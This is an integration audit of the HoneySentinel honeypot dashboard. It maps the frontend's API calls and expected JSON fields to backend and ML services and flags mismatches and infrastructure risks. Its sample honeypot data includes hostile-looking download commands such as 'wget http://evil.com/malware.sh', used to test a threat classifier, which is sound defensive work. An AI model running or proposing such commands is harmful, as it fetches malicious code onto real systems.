# HoneySentinel Frontend-to-Backend Integration Audit

This document provides an in-depth audit of the HoneySentinel frontend integration readiness for connecting to the Spring Boot API Gateway (`:8080`), Backend Service (`:8081`), Python ML Engine (`:8000`), and Analytics Service (`:8083`).

---

## 1. Complete API Endpoint & Field Mapping Audit

### Endpoint 1: Dashboard Aggregated Statistics
- **File Inspected**: `src/api/api.js` (`getDashboardStats()`), `src/pages/Dashboard.jsx`
- **API Endpoint Used**: `GET /api/dashboard/stats`
- **HTTP Method**: `GET`
- **Request Body**: None (Headers: `Content-Type: application/json`, `Accept: application/json`)
- **Expected Response Fields**:
  ```json
  {
    "totalAttacks": 120,
    "failedLogins": 110,
    "successfulLogins": 10,
    "uniqueAttackerIps": 15,
    "threatLevel": "HIGH",
    "primaryAttackType": "Brute Force",
    "riskScore": 8.5,
    "recommendation": "Block malicious subnets",
    "timeline": [
      { "t": "10:00", "attacks": 12 },
      { "t": "10:05", "attacks": 18 }
    ],
    "recentLogs": [
      {
        "time": "10:05",
        "ip": "192.168.1.100",
        "command": "wget malware.sh",
        "severity": "HIGH",
        "attackType": "Malware Download",
        "mitre": "T1105",
        "riskScore": "8.5 / 10"
      }
    ]
  }
  ```
- **Frontend Fields Consumed**:
  - Top Cards: `data.totalAttacks`, `data.failedLogins`, `data.successfulLogins`, `data.uniqueAttackerIps`
  - AI Threat Card: `data.threatLevel`, `data.primaryAttackType`, `data.riskScore`, `data.recommendation`
  - LineChart: `timeline[].t`, `timeline[].attacks`
  - Recent Table: `recentLogs[].time`, `recentLogs[].ip`, `recentLogs[].command`, `recentLogs[].severity`, `recentLogs[].attackType`, `recentLogs[].mitre`, `recentLogs[].riskScore`
- **Potential Mismatch**:
  1. If Analytics Service returns snake_case (`total_attacks`, `failed_logins`, `risk_score`, `recent_logs`, `attack_type`), the values will resolve to `undefined` / `0` / `"Unknown"`.
  2. If `timeline` objects use `time` or `timestamp` instead of `t`, or `count` instead of `attacks`, the Recharts graph will render empty lines.
  3. `getDashboardStats()` in `api.js` directly passes through `recentLogs` without field normalizers.
- **Severity**: **High**
- **Recommended Fix**: Ensure the Backend/Analytics DTO serializer uses camelCase matching these keys, or add a field normalization mapping layer in `getDashboardStats()`.

---

### Endpoint 2: Cowrie Honeypot Attack Sessions
- **File Inspected**: `src/api/api.js` (`getAttackLogs()`), `src/pages/Attacks.jsx`
- **API Endpoint Used**: `GET /api/attacks/sessions`
- **HTTP Method**: `GET`
- **Request Body**: None
- **Expected Response Fields**: Array of Cowrie session objects:
  ```json
  [
    {
      "loginTime": "2026-09-15T10:20:00",
      "sourceIp": "192.168.1.50",
      "username": "root",
      "password": "password123",
      "loginStatus": "FAILED",
      "country": "US"
    }
  ]
  ```
- **Frontend Fields Consumed**:
  - `s.loginTime` (sliced via `substring(11, 16)` to produce `HH:mm`)
  - `s.sourceIp` → `row.ip`
  - `s.username` → `row.user`
  - `s.password` → `row.pass`
  - `s.loginStatus` → `row.status`
  - `s.country` → `row.country`
- **Potential Mismatch**:
  1. If `loginTime` is returned as a Unix timestamp epoch (number) or null, `s.loginTime.substring(11, 16)` will throw a runtime `TypeError: s.loginTime.substring is not a function`.
  2. If backend field is named `timestamp`, `sessionTime`, or `source_ip`, fields fall back to `"Unknown"` and `"--:--"`.
- **Severity**: **High**
- **Recommended Fix**: Safe type-check `typeof s.loginTime === "string"` before calling `.substring(11, 16)`, with Date object fallback parsing.

---

### Endpoint 3: Captured Top Credentials
- **File Inspected**: `src/api/api.js` (`getCapturedCredentials()`), `src/pages/Credentials.jsx`
- **API Endpoint Used**: `GET /api/attacks/credentials/top`
- **HTTP Method**: `GET`
- **Request Body**: None
- **Expected Response Fields**: Array of aggregated credential records:
  ```json
  [
    {
      "username": "root",
      "password": "123456",
      "attempts": 45,
      "status": "Weak"
    }
  ]
  ```
- **Frontend Fields Consumed**:
  - `c.username` → `row.user`
  - `c.password` → `row.pass`
  - `c.attempts` → `row.attempts`
  - `c.status` → `row.status`
  - `list[0]?.user` → `data.topUser`
  - `list[0]?.pass` → `data.topPass`
- **Potential Mismatch**:
  1. If backend returns an object wrapper (e.g. `{ "topUser": "root", "topPass": "123456", "list": [...] }`) instead of a flat array, `Array.isArray(data)` fails and returns empty fallback `{ credentials: [], topUser: "-", topPass: "-" }`.
  2. If backend uses `count` or `attemptCount` instead of `attempts`.
- **Severity**: **Medium**
- **Recommended Fix**: Ensure Backend controller returns `List<CredentialDTO>` as a JSON array or update `getCapturedCredentials()` to handle both array and object response wrappers.

---

### Endpoint 4: Honeypot Executed Commands
- **File Inspected**: `src/api/api.js` (`getExecutedCommands()`), `src/pages/Commands.jsx`, `src/pages/AIAnalysis.jsx`
- **API Endpoint Used**: `GET /api/attacks/commands`
- **HTTP Method**: `GET`
- **Request Body**: None
- **Expected Response Fields**: Array of command event entities:
  ```json
  [
    {
      "commandTime": "2026-09-15T10:35:00",
      "session": {
        "sourceIp": "192.168.1.5"
      },
      "command": "wget malware.sh",
      "riskLevel": "HIGH"
    }
  ]
  ```
- **Frontend Fields Consumed**:
  - `c.commandTime` (sliced via `substring(11, 16)`)
  - `c.session?.sourceIp` → `row.ip`
  - `c.command` → `row.cmd`
  - `c.riskLevel` → `row.risk`
- **Potential Mismatch**:
  1. **Nested Session Object**: `api.js` specifically looks for `c.session?.sourceIp`. If backend DTO is flattened (e.g. `c.sourceIp` or `c.source_ip` or `c.sessionId`), `c.session?.sourceIp` returns `undefined` and the IP will display as `"Unknown"` across both Commands and AIAnalysis pages.
  2. If `commandTime` is a number timestamp instead of an ISO string.
- **Severity**: **Critical**
- **Recommended Fix**: Check both `c.session?.sourceIp` and `c.sourceIp` / `c.source_ip` in `getExecutedCommands()`.

---

### Endpoint 5: AI Single Command Classification
- **File Inspected**: `src/api/api.js` (`classifyCommand(command)`), `src/pages/Commands.jsx`, `src/pages/AIAnalysis.jsx`
- **API Endpoint Used**: `POST /api/ai/classify-command`
- **HTTP Method**: `POST`
- **Request Body**:
  ```json
  {
    "command": "wget http://evil.com/malware.sh"
  }
  ```
- **Expected Response Fields**:
  ```json
  {
    "command": "wget http://evil.com/malware.sh",
    "risk": "HIGH",
    "score": 85,
    "category": "Malware Download",
    "mitre_tactic": "TA0011 - Command and Control (T1105)",
    "recommendation": "Block remote download IP immediately"
  }
  ```
- **Frontend Fields Consumed**:
  - `aiResult.risk` → Pill color & risk badge
  - `aiResult.score` → Risk score (`85 / 100`)
  - `aiResult.category` → Attack Type
  - `aiResult.mitre_tactic` → MITRE ATT&CK identifier
  - `aiResult.recommendation` → Actionable recommendation
- **Potential Mismatch**:
  1. If Python ML service expects key `"cmd"` or `"text"` instead of `"command"`.
  2. If Python ML service returns `risk_level` instead of `risk`, `mitre` or `mitreTactic` instead of `mitre_tactic`, or `attack_type` instead of `category`.
  3. ML inference timeout: `apiRequest` has a strict 4000ms timeout. If model classification takes >4.0s, the request will be aborted.
- **Severity**: **High**
- **Recommended Fix**: Verify ML request key payload is `command` and ensure gateway routes `POST /api/ai/classify-command` to Python ML engine.

---

### Endpoint 6: AI Threat Analysis Summary
- **File Inspected**: `src/api/api.js` (`getAIAnalysisSummary()`), `src/pages/AIAnalysis.jsx`
- **API Endpoint Used**: `GET /api/ai/analysis/summary`
- **HTTP Method**: `GET`
- **Request Body**: None
- **Expected Response Fields**:
  ```json
  {
    "threatLevel": "CRITICAL",
    "attackType": "Automated Botnet Intrusion",
    "modelConfidence": "94%",
    "confidenceVal": 94,
    "classification": [
      { "label": "Total Logs Analyzed", "val": "1,240" },
      { "label": "Failed Attempts", "val": "1,180" },
      { "label": "Suspicious IPs", "val": "42" },
      { "label": "Risk Score", "val": "9.2 / 10" }
    ],
    "recommendations": [
      "Isolate honeypot subnet",
      "Deploy rate limiting on port 22"
    ]
  }
  ```
- **Frontend Fields Consumed**:
  - `data.threatLevel`
  - `data.attackType`
  - `data.modelConfidence` or `data.confidenceVal`
  - `data.classification` (Array of `{ label, val }`)
  - `data.recommendations` (Array of strings)
- **Potential Mismatch**:
  1. If backend returns `classification` as an object map (e.g. `{"totalLogs": 1240, "failedAttempts": 1180}`) rather than an array of `{label, val}`, the frontend discards it and falls back to all `0`s.
  2. If confidence is returned as a float `0.94`, `confidenceValue` will calculate as `"0.94%"` (less than 1% on the progress bar).
- **Severity**: **Medium**
- **Recommended Fix**: Ensure backend returns `classification` array or support key-value map transformation in `getAIAnalysisSummary()`.

---

### Endpoint 7: Spring Boot Gateway Health
- **File Inspected**: `src/api/api.js` (`checkSystemHealth()`), `src/pages/Settings.jsx`
- **API Endpoint Used**: `GET /health`
- **HTTP Method**: `GET`
- **Request Body**: None
- **Expected Response**: HTTP 200 OK
- **Potential Mismatch**:
  - Spring Boot Actuator standard health check endpoint is `/actuator/health`, NOT `/health`. If the gateway does not expose a custom root `/health` controller or path rewrite, this call will return HTTP 404, causing the Settings page to falsely report "Spring Boot Gateway: Offline".
- **Severity**: **Critical**
- **Recommended Fix**: Verify gateway routes `/health` or check `/actuator/health`.

---

### Endpoint 8: Python ML Service Health
- **File Inspected**: `src/api/api.js` (`checkSystemHealth()`), `src/pages/Settings.jsx`
- **API Endpoint Used**: `GET /api/ai/health`
- **HTTP Method**: `GET`
- **Request Body**: None
- **Expected Response**: `{ "status": "UP" }` (HTTP 200)
- **Potential Mismatch**:
  - The check explicitly asserts `aiData.status === "UP"`. If Python FastAPI/Flask returns `{ "status": "ok" }`, `{ "status": "healthy" }`, or `{ "status": "UP" }` in lowercase (`"up"`), the status tone is marked amber / "Unavailable".
- **Severity**: **High**
- **Recommended Fix**: Case-insensitive comparison `String(aiData.status).toUpperCase() === "UP" || aiData.status === "healthy" || aiData.status === "ok"`.

---

### Endpoint 9: Threat Intelligence PDF Report Generation
- **File Inspected**: `src/api/api.js` (`generateThreatReport()`), `src/pages/Dashboard.jsx`
- **API Endpoint Used**: `GET /api/reports/generate`
- **HTTP Method**: `GET`
- **Request Body**: None (Headers: `Accept: application/pdf`)
- **Expected Response**: Binary stream of PDF file (`application/pdf`)
- **Potential Mismatch**:
  - If backend encounters an exception and returns JSON `{ "error": "Report service failure" }` with status 200, `response.blob()` creates a corrupted `.pdf` file containing the JSON text.
- **Severity**: **Medium**
- **Recommended Fix**: Check `response.headers.get("content-type")?.includes("application/pdf")` before creating the blob download.

---

## 2. Infrastructure & Communication Checklist

| Inspection Item | Current Status | Risk / Observation |
|---|---|---|
| **CORS Configuration** | Gateway Dependent | Frontend runs on `:5173`, Gateway on `:8080`. Gateway must have `@CrossOrigin` / CORS enabled for `http://localhost:5173`. |
| **Request Timeout** | 4000ms hardcoded | `AbortController` timeout is 4 seconds. ML inference or heavy SQL queries taking >4s will fail silently to fallback. |
| **Authentication Headers** | None attached | `apiRequest()` does not attach `Authorization: Bearer <token>`. Gateway endpoints must allow anonymous access or handle cookies. |
| **Error Handling on Disconnect** | Resilient | If backend is offline, `apiRequest()` catches errors and supplies default fallback objects without throwing React rendering crashes. |
| **Loading States** | Cleanly handled | All pages show loading indicators or clean initial state while waiting for network responses. |
| **Empty States** | Cleanly handled | Attacks, Credentials, Commands, Dashboard, AI Analysis show clear empty state messages when database has 0 records. |
| **Fake/Demo Data in State** | Completely Removed | Hardcoded initial demo tables were removed in the previous fix step. |

---

## 3. Readiness Verdict

### **READY FOR BACKEND CONNECTION (With Configuration Notes)**

The HoneySentinel frontend is **structurally and architecturally ready** for connection to the Spring Boot Gateway. 

#### Pre-Connection Verification Required on Backend:
1. **CORS**: Ensure Spring Boot API Gateway (`:8080`) allows `http://localhost:5173` (or production domain).
2. **DTO Field Names**: Ensure `GET /api/attacks/commands` returns `session.sourceIp` or top-level `sourceIp`, and `GET /api/attacks/sessions` returns ISO-formatted `loginTime`.
3. **Health Check Routing**: Ensure `/health` and `/api/ai/health` are reachable through the Gateway.
